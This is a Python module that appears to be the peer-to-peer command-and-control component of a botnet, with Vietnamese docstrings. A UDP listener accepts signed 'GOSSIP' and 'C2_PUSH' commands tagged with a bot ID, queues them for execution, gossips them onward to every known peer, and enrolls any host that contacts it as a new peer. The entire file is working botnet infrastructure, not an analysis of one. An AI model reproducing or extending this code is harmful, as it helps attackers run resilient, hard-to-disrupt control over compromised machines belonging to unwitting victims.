import socket
import json
import os
import random
import threading

from .config import P2P_PORT, PEER_STATUS, CMD_LOCK, BOT_ID
from .crypto import verify_command


def gossip_to_all(cmd_ref, skip_ip=None):
    """Lan truyền lệnh đến tất cả peer đã biết, bỏ qua nguồn gửi."""
    if cmd_ref["cmd"].get("type") == "WAIT":
        return

    msg = json.dumps({
        "type": "GOSSIP",
        "version": cmd_ref["version"],
        "payload": cmd_ref["cmd"],
        "from": BOT_ID,
    }).encode()

    targets = [(ip, st) for ip, st in PEER_STATUS.items() if ip != skip_ip]
    random.shuffle(targets)

    for ip, st in targets:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(msg, (ip, st.get("port", P2P_PORT)))
            sock.close()
        except:
            pass

    print(f"[P2P] Gossiped to {len(targets)} peers")


def handle_new_command(cmd_queue, cmd_ref, payload, version, source):
    """Xử lý lệnh mới từ GOSSIP hoặc C2_PUSH."""
    with CMD_LOCK:
        if version > cmd_ref["version"] and verify_command(payload):
            print(f"[P2P] ← v{version} from {source}")
            cmd_queue.put(payload)
            cmd_ref["version"] = version
            cmd_ref["cmd"] = payload
            threading.Thread(target=gossip_to_all, args=({"version": version, "cmd": payload}, source), daemon=True).start()
            return True
    return False


def p2p_listener(cmd_queue, cmd_ref):
    """UDP listener - trung tâm nhận lệnh."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(("0.0.0.0", P2P_PORT))
    except OSError:
        print(f"[P2P] Port {P2P_PORT} in use → another instance running, exiting")
        os._exit(0)

    print(f"[P2P] Listening :{P2P_PORT}")

    while True:
        data, addr = sock.recvfrom(4096)
        try:
            msg = json.loads(data.decode())
            mtype = msg.get("type")

            if mtype == "PING":
                sock.sendto(json.dumps({"type": "PONG"}).encode(), addr)

            elif mtype in ("GOSSIP", "C2_PUSH"):
                payload = msg.get("payload", {})
                version = msg.get("version", 0)
                handle_new_command(cmd_queue, cmd_ref, payload, version, addr[0])

            peer_ip = addr[0]
            if peer_ip not in PEER_STATUS:
                PEER_STATUS[peer_ip] = {"port": P2P_PORT}
                print(f"[P2P] New peer: {peer_ip}")

        except:
            pass
